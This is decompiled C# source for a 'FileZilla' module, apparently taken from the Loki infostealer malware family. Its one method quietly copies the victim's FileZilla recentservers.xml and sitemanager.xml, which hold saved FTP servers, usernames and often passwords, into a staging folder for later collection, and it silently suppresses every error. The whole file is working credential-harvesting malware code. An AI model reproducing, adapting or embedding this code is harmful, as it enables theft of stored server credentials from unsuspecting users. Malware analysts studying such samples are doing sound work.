using System;
using System.IO;

namespace loki.loki.Utilies.App
{
	// Token: 0x0200002C RID: 44
	internal class FileZilla
	{
		// Token: 0x06000173 RID: 371 RVA: 0x00009F00 File Offset: 0x00008100
		public static void get_filezilla(string string_0)
		{
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml"))
			{
				try
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\recentservers.xml", string_0 + "\\Apps\\FileZilla\\filezilla_recentservers.xml", true);
				}
				catch
				{
				}
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml"))
				{
					try
					{
						Directory.CreateDirectory(string_0 + "\\Apps\\FileZilla");
						File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Filezilla\\sitemanager.xml", string_0 + "\\Apps\\FileZilla\\filezilla_sitemanager.xml", true);
					}
					catch
					{
					}
				}
			}
		}
	}
}
